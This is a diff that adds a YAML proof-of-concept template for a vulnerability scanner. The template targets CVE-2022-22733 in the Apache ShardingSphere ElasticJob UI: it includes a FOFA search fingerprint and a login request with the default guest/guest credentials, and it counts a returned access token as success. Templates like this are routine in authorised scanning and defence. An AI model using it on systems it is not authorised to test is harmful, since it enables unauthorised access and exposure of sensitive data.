@@ -1,0 +1,19 @@
+id: poc-yaml-apache-shardingsphere-elasticjob-ui-sensitive-information-leak
+info:
+  name: Apache ShardingSphere ElasticJob UI 敏感信息泄漏漏洞(CVE-2022-22733)
+  severity: medium
+  tags:
+  - CVE-2022-22733
+  - 信息泄露
+  finger: shardingsphere_elasticjob-ui
+  fofa: icon_hash="816588900"
+requests:
+- method: POST
+  path: /api/login
+  headers:
+    Content-Type: application/json
+  data: '{"username":"guest","password":"guest"}'
+  expression: status_code == 200 && contains(body,"\"success\":true") && contains(body,"\"isGuest\":true")
+    && contains(body,"accessToken") && contains(headers,"application/json")
+variables: {}
+transport: http
